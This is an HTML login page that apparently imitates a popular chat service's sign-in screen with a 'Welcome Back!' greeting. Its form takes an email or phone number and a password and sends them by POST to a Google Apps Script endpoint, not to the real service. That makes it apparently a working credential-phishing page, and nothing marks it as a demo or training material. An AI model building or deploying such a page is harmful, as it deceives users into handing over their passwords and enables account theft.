<html>
    <head>
        <script src="script.js"></script>
    </head>
    <body style="background-image:url('images/background.svg');background-repeat:no-repeat;background-size:cover;">
        <img src="images/logo.svg" style="padding:50px">
        <div style="font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;color:white;position:absolute;transform:translate(-50%,-50%);left: 50vw;top:50vh;background-color: rgb(45, 45, 45);padding:15px 25px;border-radius:5px;">
            <p style="text-align: center; font-size: 2vw;">Welcome Back!</p>
            <p style="font-size:medium; font-family: 'Arial'; text-align: center;color:grey;margin:0px 90px 30px 90px">We're so excited to see you again!</p>
            <form id='my-form' method="POST" action="https://script.google.com/macros/s/AKfycbwAaeImKVs2pHsZ6b9QpuH11K_ziZrG-S8oUvneeiyiU8AabHCYTyzUr0EY_DVvfFhxjw/exec">
                <label for="Email" style="font-size: small;color:rgb(200,200,200);">EMAIL OR PHONE NUMBER</label><br>
                <input id="Email" name="Email" type="email" required style="background-color: black;margin:8px 0px;padding:10px;width:100%;border:0;border-radius: 3px;caret-color: white;"><br>
                <label for="Pass" style="font-size: small;color:rgb(200,200,200);">PASSWORD</label><br>
                <input id="Pass" name="Password" type="password" required style="background-color: black;margin:8px 0px 0px 0px;padding:10px;width:100%;border:0;border-radius:3px;caret-color: white;"><br>
                <p style="color:lightblue; font-size: 0.8vw; font-family: 'Arial';margin:5 0 15 0">Forgot your password?</p>
                <button type="submit" style="width:100%;background-color: rgb(88,141,242);border:0;padding:10px 30px;font-family:'franklin Gothic Medium';color:white;border-radius: 5px;">LOG IN</button>
            </form>  
        </div>
    </body>
</html>
